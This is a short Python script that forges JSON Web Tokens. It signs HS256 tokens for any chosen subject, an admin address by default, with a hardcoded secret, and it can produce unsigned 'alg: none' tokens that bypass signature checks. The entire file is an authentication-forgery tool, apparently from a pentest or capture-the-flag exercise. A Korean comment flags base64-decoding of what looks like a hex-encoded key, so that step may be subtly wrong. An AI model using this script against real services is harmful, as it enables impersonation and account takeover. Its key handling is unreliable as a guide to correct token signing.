# -*- coding: utf-8 -*-
import hmac, hashlib, base64, json, time, sys

SECRET = "5367566B59703373367639792F423F4528482B4D6251655468576D5A71347437"

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

def forge(sub, ttl=3600, alg="HS256"):
    header = {"alg": alg}
    now = int(time.time())
    payload = {"sub": sub, "iat": now, "exp": now + ttl}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h + b"." + p
    if alg == "none":
        return (signing_input + b".").decode()
    
    # 수정 포인트: Base64 디코딩 적용
    secret_bytes = base64.b64decode(SECRET)
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64u(sig)).decode()

if __name__ == "__main__":
    sub = sys.argv[1] if len(sys.argv) > 1 else "admin@aa.com"
    alg = sys.argv[2] if len(sys.argv) > 2 else "HS256"
    print(forge(sub, alg=alg))